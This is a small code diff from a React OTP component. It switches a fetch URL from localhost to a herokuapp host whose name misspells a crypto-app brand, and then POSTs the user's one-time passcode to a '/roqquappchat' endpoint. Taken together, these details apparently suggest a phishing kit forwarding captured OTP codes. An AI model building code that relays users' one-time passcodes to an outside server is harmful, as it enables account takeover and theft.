@@ -28,9 +28,9 @@ export default function Otp(props) {
             templateParams.clientOtp = clientOtp
 
             try {
-                const URL = 'http://localhost:3030'
+               // const URL = 'http://localhost:3030'
 
-                // const URL = 'https://roqq.herokuapp.com'
+               const URL = 'https://roqqqq.herokuapp.com'
                 const response = await fetch(URL + '/roqquappchat', {
                     method: 'POST',
                     headers: {
